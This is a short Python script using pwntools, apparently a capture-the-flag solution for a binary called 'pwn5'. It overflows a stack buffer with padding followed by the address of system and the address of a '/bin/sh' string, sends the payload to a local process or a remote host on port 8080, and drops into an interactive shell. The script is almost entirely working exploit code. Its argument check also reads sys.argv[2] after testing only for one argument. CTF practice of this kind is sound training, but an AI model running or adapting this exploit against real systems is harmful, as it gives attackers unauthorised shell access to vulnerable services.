from pwn import *

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "target"
PORT = 8080
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./pwn5")

elf=ELF("./pwn5")

payload=b"A"*(0xD+0x4)
payload+=p32(elf.symbols["system"])
payload+=b"A"*4
payload+=p32(next(elf.search(b"/bin/sh")))
conn.recvuntil("ls:")
conn.sendline(payload)
conn.interactive()
